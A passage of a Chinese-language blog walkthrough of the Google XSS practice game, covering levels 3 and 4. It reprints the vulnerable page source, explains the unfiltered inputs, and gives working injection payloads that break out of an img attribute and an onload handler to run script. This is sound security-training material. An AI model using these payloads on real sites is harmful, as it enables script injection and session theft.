class="token operator">/</span><span class="token operator">></span></code></pre><p>代码存进了服务器里，只要刷新都会触发</p><img src="/article/xss/image-20210424145306208.png" class="" title="level2-1" loading="lazy"><img src="/article/xss/image-20210424145406792.png" class="" title="level2-2" loading="lazy"><hr><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><a href="https://xss-game.appspot.com/level3/frame#1">https://xss-game.appspot.com/level3/frame#1</a></p><p>源码·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token comment">&lt;!-- Load jQuery --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span>      <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">function</span> <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token parameter">num</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Dynamically load the appropriate image.</span>        <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">"Image "</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        html <span class="token operator">+=</span> <span class="token string">"&lt;img src='/static/level3/cloud"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tabContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>         window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> num<span class="token punctuation">;</span>         <span class="token comment">// Select the current tab</span>        <span class="token keyword">var</span> tabs <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'.tab'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tabs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id <span class="token operator">==</span> <span class="token string">"tab"</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"tab active"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"tab"</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>         <span class="token comment">// Tell parent we've changed the tab</span>        top<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token comment">// Extra code so that we can communicate with the parent page</span>      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>source <span class="token operator">==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level3.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Take a tour of our cloud data center.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab1<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>1<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab2<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>2<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab3<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>3<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tabContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>关键代码</p><pre class="language-js" data-language="js"><code class="language-js">html <span class="token operator">+=</span> <span class="token string">"&lt;img src='/static/level3/cloud"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tabContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>         window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> num<span class="token punctuation">;</span></code></pre><p><code>num</code>是#后面的输入，没有经过任何过滤，所以让它的img标签闭合，再加上我们的代码即可</p><p><code>&lt;img src=&#39;/static/level3/cloud + num + .jpg&#39; /&gt;</code></p><p>即变为<code>&lt;img src=&#39;/static/level3/cloud&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;.jpg&#39; /&gt;</code></p><p>Payload：</p><pre class="language-js" data-language="js"><code class="language-js">'<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span></code></pre><img src="/article/xss/image-20210424150902973.png" class="" title="level3-1" loading="lazy"><img src="/article/xss/image-20210424150928175.png" class="" title="level3-2" loading="lazy"><hr><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><a href="https://xss-game.appspot.com/level4/frame#">https://xss-game.appspot.com/level4/frame#</a></p><p>源码·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level4.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timer<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timer<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Create timer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'timer'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Show main timer page</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token comment"># Show the results page</span>      timer<span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'timer'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'timer.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token string">'timer'</span> <span class="token punctuation">:</span> timer <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Timer.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">function</span> <span class="token function">startTimer</span><span class="token punctuation">(</span><span class="token parameter">seconds</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        seconds <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           window<span class="token punctuation">.</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"Time is up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> seconds <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level4.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>startTimer(<span class="token punctuation">'</span>&#123;&#123; timer &#125;&#125;<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>关键代码</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>startTimer(<span class="token punctuation">'</span>&#123;&#123; timer &#125;&#125;<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><p>默认3秒<code>seconds = parseInt(seconds) || 3;</code></p><p>输入100，看到加载如下</p><p><code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;100&#39;);&quot;&gt;</code></p><p>于是想办法闭合，用单引号闭合<code>startTimer</code>，然后写弹窗再和后面的<code>&#39;)</code>闭合</p><blockquote><p>onload 事件会在页面或图像加载完成后立即发生</p></blockquote><p>Payload:</p><pre class="language-none"><code class="language-none">&#39;);alert(&#39;1</code></pre><p>即变为<code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#39;);alert(&#39;1&#39;);&quot;&gt;</code></p><img src="/article/xss/image-20210424152557697.png" class="" title="level4-1" loading="lazy"><img src="/article/xss/image-20210424152620652.png" class="" title="level4-2" loading="lazy"><hr><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p><a href="https://xss-game.appspot.com/level5/frame#">https://xss-game.appspot.com/level5/frame#</a></p><p>源码·confirm.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level5.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    Thanks for signing up, you will be redirected soon...    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token 